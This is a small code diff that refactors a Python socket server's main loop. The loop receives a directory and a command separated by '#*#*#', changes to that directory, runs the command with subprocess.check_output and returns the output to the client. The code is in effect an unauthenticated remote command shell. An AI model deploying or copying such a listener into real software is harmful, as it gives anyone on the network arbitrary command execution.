@@ -13,11 +13,10 @@ def main():
     while True:
         try:
             conn, address = sock.accept()
-            cmd = conn.recv(2048).decode('utf-8')
-            arr = cmd.split('#*#*#')
-            os.chdir(convert(arr[0]))
+            cmd = conn.recv(2048).decode('utf-8').split('#*#*#')
+            os.chdir(convert(cmd[0]))
             try:
-                result = subprocess.check_output(arr[1])
+                result = subprocess.check_output(cmd[1])
             except Exception as e:
                 result = str(e).encode('utf-8')
             conn.send(result)
